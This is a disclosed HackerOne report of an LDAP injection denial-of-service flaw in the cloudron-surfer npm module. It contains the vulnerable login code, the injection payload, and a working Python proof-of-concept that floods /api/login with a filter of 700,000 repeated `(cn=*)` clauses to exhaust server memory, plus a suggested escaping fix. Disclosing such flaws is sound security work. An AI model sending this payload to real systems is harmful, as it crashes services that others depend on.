# [cloudron-surfer] Denial of Service via LDAP Injection

## Report Details
- **Report ID**: 906959
- **URL**: https://hackerone.com/reports/906959
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-24T17:12:07.769Z
- **Disclosed**: 2020-08-22T08:48:44.185Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report `Denial of service via LDAP Injection` vulnerability in `cloudron-surfer` module.
It allows a malicious attacker to send a malformed input that is interpreted as an LDAP filter, leading to Denial of Service.

# Module

**module name:** `cloudron-surfer`
**version:** `5.9.0`
**npm page:** `https://www.npmjs.com/package/cloudron-surfer`

## Module Description

Surfer is a Simple static file server. It comes with a commandline tool to upload files from your local folders and a webinterface to manage files directly on the server.

## Module Stats

[4] weekly downloads

# Vulnerability

## Vulnerability Description

The module is vulnerable to a DoS via LDAP Injection.
LDAP injection is a particular case of Injection vulnerabilities that occurs when user controlled input not properly sanitized is used to build LDAP filter. 
This could lead to modification of LDAP statements performed. Depending on the application, this could lead to an authentication bypass, information disclosure or DoS.

The problem arises during the login phase. User controlled input `username` is used to build a LDAP filter without any sanitization. 
The filter uses an `OR` operation between different attributes that are `uid`, `mail`, `username`, `sAMAccountName`.
The search returns all the users whose one of the attributes above has value `username`. Then it takes the first and match with the `password` provided using a `bind` operation.

The problem occurs when the `username` contains valid LDAP character filters, like for example `*` (the filter `(cn=*)` is a presence filter that will match any entry with one or more values for the `cn` attribute), that could change the LDAP statement.

If an attacker provides as `username` the value `*`, this will result in the following filter:
`(|(uid=*)(mail=*)(username=*)(sAMAccountName=*))`.

In order for an attacker to perform a DoS, he/she has to build a filter that will take long time to be evaluated.
For example, if the attacker provides the following payload `*)(cn=*)(cn=*`, this will result in the following filter:
`(|(uid=*)(cn=*)(cn=*)(mail=*)(cn=*)(cn=*)(username=*)(cn=*)(cn=*)(sAMAccountName=*)(cn=*)(cn=*))`.

If instead of `*)(cn=*)(cn=*`, an attacker repeat the middle `(cn=*)` thousand of times, this will result in a huge filter that will take a huge amount of time to be evaluated, leading to DoS.

Below the vulnerable code:

```javascript
// https://github.com/nebulade/surfer/blob/master/src/auth.js#L72
// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L74
....

function verifyUser(username, password, callback) {
    if (AUTH_METHOD === 'ldap') {
        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });
        ldapClient.on('error', function (error) {
            console.error('LDAP error', error);
        });

        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {
            if (error) return callback(error);

            var filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`; //<-- INJECTION: username is not sanitized
            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: filter }, function (error, result) {
                if (error) return callback(error);

                var items = [];

                result.on('searchEntry', function(entry) { items.push(entry.object); });
                result.on('error', callback);
                result.on('end', function (result) {
                    if (result.status !== 0 || items.length === 0) return callback('Invalid credentials');

                    // pick the first found
                    var user = items[0];

                    ldapClient.bind(user.dn, password, function (error) {
                        if (error) return callback('Invalid credentials');

                        callback(null, { username: username });
                    });
                });
            });
        });
    }
...

// https://github.com/nebulade/surfer/blob/master/src/auth.js#L107
// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L113
exports.login = function (req, res, next) {
    verifyUser(req.body.username, req.body.password, function (error, user) { //<-- USER CONTROLLED INPUT
        if (error) return next(new HttpError(401, 'Invalid credentials'));

        var accessToken = LOGIN_TOKEN_PREFIX + uuid();

        tokenStore.set(accessToken, user, function (error) {
            if (error) return next(new HttpError(500, error));

            next(new HttpSuccess(201, { accessToken: accessToken, user: user }));
        });
    });
};

```

```javascript
// https://github.com/nebulade/surfer/blob/master/server.js#L76
// https://git.cloudron.io/cloudron/surfer/-/blob/master/server.js#L75
...
router.post  ('/api/login', auth.login);
...
```
## Steps To Reproduce:

To test this app on a real live system, you need first to install `Cloudron` (https://cloudron.io/get.html) and then install the `Surfer` app (https://cloudron.io/store/io.cloudron.surfer.html). In order to install the `Cloudron` app you need first a domain. In this case the web interface is available under the `https://[appdomain]/_admin/` location.

Istead of the above setting, I tested the app locally. 
Below steps to reproduce the vulnerability.

As mentioned in another project (https://github.com/nebulade/meemo#development ), to simulate a LDAP server for users authentication, I used a test server provided by the same author (https://github.com/nebulade/ldapjstestserver). (you can find attached).

- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `cloudron-surfer` module:
    -  `npm i cloudron-surfer`

- start the LDAP test server:
    -  `node ldapjstestserver.js`

- start the `surfer` app locally (we need to setup some enviroment variables to enable the LDAP authentication):
    - `CLOUDRON_LDAP_BIND_DN="cn=admin,ou=users,dc=example" CLOUDRON_LDAP_BIND_PASSWORD="password" CLOUDRON_LDAP_USERS_BASE_DN="ou=users,dc=example" CLOUDRON_LDAP_URL="ldap://localhost:3002" node node_modules/cloudron-surfer/server.js`

Before performing the attack let's first check that everything works as expected:
- visit `http://localhost:3000/_admin/`
- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter
- logout 

Before performing the attack let's first check that everything works as expected even with a long value for `username`:
- visit `http://localhost:3000/_admin/`
- run the following `python` script (`run_safe.py`):

```python
import requests

url = 'http://localhost:3000/api/login'

payload =  "a"*(len("*)") + len("(cn=*)")*700000 + len("(cn=*"))

print(f"Payload's length: {len(payload)} characters")

data = {
    'username': payload,
    'password': 'pass'
}

response = requests.post(url, data = data)
```

- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter
- logout 

Reproduce the attack:
- visit `http://localhost:3000/_admin/`
- run the following `python` script (`run.py`):

```python
import requests

url = 'http://localhost:3000/api/login'

payload = "*)" + "(cn=*)"*700000 + "(cn=*"

print(f"Payload's length: {len(payload)} characters")

data = {
    'username': payload,
    'password': 'pass'
}

response = requests.post(url, data = data)
```
- the page will load until the server crashes. After some time you will get the following error:
`FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`

If an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.

{F881315}

## Patch
Sanitize the user input before using it to build LDAP filters.

Possible solution could be for example this one (taken from another project):
- Github Issue: [Vulnerable to ldap injection](https://github.com/vesse/node-ldapauth-fork/issues/21)
- Github Commit: [Sanitize user input: Replace the specific special characters with codes as defined in LDAP specification.](https://github.com/vesse/node-ldapauth-fork/commit/3feea43e243698bcaeffa904a7324f4d96df60e4) 

Inspired by the same issue (https://github.com/vesse/node-ldapauth-fork/issues/21), here there are the RFC specifications (https://tools.ietf.org/search/rfc4515#section-3 ):
```
    The rule ensures that the entire filter string is a
    valid UTF-8 string and provides that the octets that represent the
    ASCII characters "*" (ASCII 0x2a), "(" (ASCII 0x28), ")" (ASCII
    0x29), "" (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a
    backslash "" (ASCII 0x5c) followed by the two hexadecimal digits
    representing the value of the encoded octet.

    This simple escaping mechanism eliminates filter-parsing ambiguities
    and allows any filter that can be represented in LDAP to be
    represented as a NUL-terminated string. Other octets that are part
    of the set may be escaped using this mechanism, for example,
    non-printing ASCII characters.

    For AssertionValues that contain UTF-8 character data, each octet of
    the character to be escaped is replaced by a backslash and two hex
    digits, which form a single octet in the code of the character. For
    example, the filter checking whether the "cn" attribute contained a
    value with the character "" anywhere in it would be represented as
    "(cn=\2a*)".

    As indicated by the rule, implementations MUST escape
    all octets greater than 0x7F that are not part of a valid UTF-8
    encoding sequence when they generate a string representation of a
    search filter. Implementations SHOULD accept as input strings that
    are not valid UTF-8 strings. This is necessary because RFC 2254 did
    not clearly define the term "string representation" (and in
    particular did not mention that the string representation of an LDAP
    search filter is a string of UTF-8-encoded Unicode characters).
```




## Supporting Material/References:

Some helpful resources I used for this research:
- [LDAP injection](https://en.wikipedia.org/wiki/LDAP_injection)
- [LDAP Filters](https://ldap.com/ldap-filters/)
- [BlackHat: LDAP Injection & Blind LDAP Injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
- [Understanding and Defending Against LDAP Injection Attacks](https://ldap.com/2018/05/04/understanding-and-defending-against-ldap-injection-attacks/)
- [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
- [Ldapjs - orfilter](http://ldapjs.org/filters.html#orfilter)

My setup:
- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Denial of service

## Attachments
- run_safe.py
- ldapjstestserver.js
- run.py
- poc.mov
